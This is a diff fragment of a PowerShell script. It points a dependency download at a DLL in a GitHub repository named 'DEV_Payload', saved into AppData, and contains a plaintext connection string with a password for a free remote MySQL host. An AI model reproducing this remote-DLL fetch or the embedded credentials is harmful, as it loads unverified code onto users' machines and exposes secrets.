@@ -9,8 +9,7 @@ $AppDataPath = [Environment]::GetFolderPath("ApplicationData")
 $DependencyPath = Join-Path -Path $AppDataPath -ChildPath "MySql.Data.dll"
 
 # URL to download MySql.Data.dll if missing
-$DependencyUrl = "https://yourserver.com/deps/MySql.Data.dll"
-
+$DependencyUrl = "https://github.com/Umair13303/DEV_Payload/raw/refs/heads/main/EXE_FILE/SQL_Library/net462/MySql.Data.dll"
 # Connection details
 $ConnectionString = "server=sql7.freesqldatabase.com;port=3306;uid=sql7788502;pwd=Y3jJUaTBR4;database=sql7788502"
 
